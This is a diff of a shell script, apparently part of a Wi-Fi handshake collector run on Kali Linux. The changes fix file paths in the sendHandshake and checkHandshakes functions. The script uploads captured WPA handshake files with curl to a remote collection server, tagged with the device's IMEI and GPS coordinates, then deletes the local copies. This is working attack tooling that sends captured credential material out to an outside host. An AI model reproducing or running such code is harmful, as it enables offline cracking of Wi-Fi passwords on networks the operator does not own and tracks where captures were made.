@@ -57,9 +57,9 @@ sendHandshake() {
         echo "IMEI: "$imei
         echo $1
         echo "curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $2" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/task"
-        curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $2" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/task
+        curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $1" -H "Content-Type: multipart/form-data" -F "file=@./shakes/$1" http://$serverAddr/task
         if [[ $? == 0 ]]; then
-                rm $1
+                rm ./shakes/$1
         else
                 echo "Failed send file $1"
         fi
@@ -85,7 +85,7 @@ checkHandshakes() {
                         chmod 777 -R /home/kali/hscollector/shakes
                         mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time-$imei
                 fi
-                sendHandshake /home/kali/hscollector/shakes/shake-$time $filename
+                sendHandshake $filename
         fi
 
 }
